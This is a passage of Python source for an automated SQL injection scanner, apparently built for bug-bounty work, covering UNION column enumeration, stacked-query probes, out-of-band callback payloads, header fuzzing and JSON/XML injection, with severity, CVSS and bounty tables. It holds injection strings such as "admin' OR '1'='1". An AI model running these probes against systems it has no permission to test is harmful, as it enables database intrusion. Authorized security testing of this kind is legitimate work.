    async def _enumerate_columns(self, target: str, param: str) -> int:
        """Enumerate number of columns for UNION"""
        for num in range(1, self.max_union_columns + 1):
            nulls = ','.join(['NULL'] * num)
            test_payload = f"1' ORDER BY {num}--"
            
            try:
                test_url = f"{target}?{param}={quote(test_payload)}"
                resp = await self._make_request(test_url)
                
                if not resp or resp.status != 200:
                    # Previous number was the max
                    return num - 1
                    
            except Exception:
                return num - 1
        
        return 0
    
    async def _stacked_query_testing(self, target: str, params: Dict):
        """Test for stacked query support"""
        untested = [p for p in params.get('url_params', []) if p not in self.tested_params]
        
        for param in untested:
            for db_type, payloads in self.payloads['stacked'].items():
                for payload_obj in payloads[:2]:  # Limit aggressive tests
                    try:
                        test_url = f"{target}?{param}={quote(payload_obj.payload)}"
                        resp = await self._make_request(test_url)
                        
                        if resp:
                            # Stacked queries usually don't show error on successful execution
                            # Look for timing or content changes
                            self.logger.info(f"   Potential stacked query in {param} ({db_type})")
                    except Exception:
                        pass
    
    async def _oob_testing(self, target: str, params: Dict):
        """Out-of-band SQLi testing"""
        if not self.oob_callback:
            return
        
        untested = [p for p in params.get('url_params', []) if p not in self.tested_params]
        
        for param in untested:
            for db_type, payloads in self.payloads['oob'].items():
                for payload_obj in payloads:
                    payload = payload_obj.payload.format(callback=self.oob_callback)
                    
                    try:
                        test_url = f"{target}?{param}={quote(payload)}"
                        await self._make_request(test_url)
                        self.logger.info(f"   OOB payload injected in {param} ({db_type})")
                    except Exception:
                        pass
    
    async def _advanced_header_testing(self, target: str):
        """Advanced header-based SQLi testing"""
        headers_to_test = {
            'User-Agent': 'Mozilla/5.0',
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Forwarded-Host': 'localhost',
            'Referer': 'https://google.com/',
            'X-Original-URL': '/test',
            'X-Rewrite-URL': '/test',
            'X-Forwarded-Proto': 'https',
            'X-HTTP-Host-Override': 'localhost',
            'Forwarded': 'for=127.0.0.1',
            'Client-IP': '127.0.0.1',
            'True-Client-IP': '127.0.0.1',
            'CF-Connecting-IP': '127.0.0.1',
            'X-Cluster-Client-IP': '127.0.0.1',
        }
        
        for header, base_value in headers_to_test.items():
            for db_type, payloads in self.payloads['error'].items():
                for payload_obj in payloads[:3]:
                    try:
                        headers = {header: f"{base_value}{payload_obj.payload}"}
                        resp = await self._make_request(target, headers=headers)
                        
                        if resp:
                            body = await resp.text()
                            if self._check_error_signatures_advanced(body, db_type):
                                self._create_advanced_finding(
                                    target, header, payload_obj, db_type,
                                    'Header-based Error', body, None
                                )
                                return
                    except Exception:
                        pass
    
    async def _content_type_testing(self, target: str, endpoints: List[str]):
        """Test JSON and XML content types"""
        json_test = {
            'id': "1' AND 1=1--",
            'user': "admin' OR '1'='1",
        }
        
        xml_test = """<?xml version="1.0"?>
        <test>
            <id>1' AND 1=1--</id>
        </test>"""
        
        for endpoint in endpoints[:3]:
            # Test JSON
            try:
                resp = await self._make_request(
                    endpoint, 
                    method='POST',
                    json=json_test,
                    headers={'Content-Type': 'application/json'}
                )
                if resp:
                    body = await resp.text()
                    if any(db in body.lower() for db in ['mysql', 'sql', 'error']):
                        self.logger.warning(f"   Potential SQLi in JSON at {endpoint}")
            except Exception:
                pass
            
            # Test XML
            try:
                resp = await self._make_request(
                    endpoint,
                    method='POST',
                    data=xml_test,
                    headers={'Content-Type': 'application/xml'}
                )
                if resp:
                    body = await resp.text()
                    if 'error' in body.lower():
                        self.logger.warning(f"   Potential SQLi in XML at {endpoint}")
            except Exception:
                pass
    
    def _create_advanced_finding(self, target: str, param: str, payload: SQLiPayload,
                                db_type: str, technique: str, evidence_body: str,
                                fingerprint: Optional[DBFingerprint]):
        """Create comprehensive SQLi finding"""
        
        severity_map = {
            'Error-based': 'High',
            'UNION-based': 'Critical',
            'Boolean-based Blind': 'High',
            'Time-based Blind': 'High',
            'Stacked': 'Critical',
            'Header-based Error': 'High',
            'Out-of-Band': 'Critical'
        }
        
        cvss_map = {
            'Error-based': 8.6,
            'UNION-based': 9.8,
            'Boolean-based Blind': 8.1,
            'Time-based Blind': 8.1,
            'Stacked': 9.8,
            'Header-based Error': 8.6,
            'Out-of-Band': 9.1
        }
        
        bounty_map = {
            'Error-based': 3000,
            'UNION-based': 5000,
            'Boolean-based Blind': 4000,
            'Time-based Blind': 4000,
            'Stacked': 6000,
            'Header-based Error': 3000,
            'Out-of-Band': 5000
        }
        
        # Truncate evidence
        if len(evidence_body) > 1000:
            evidence_body = evidence_body[:1000] + "..."
        
        # Build description
        description = f"""## SQL Injection Vulnerability

**Type:** {technique}
**Parameter:** `{param}`
**Database:** {db_type}
**Severity:** {severity_map.get(technique, 'High')}

### Payload
```sql
{payload.payload}
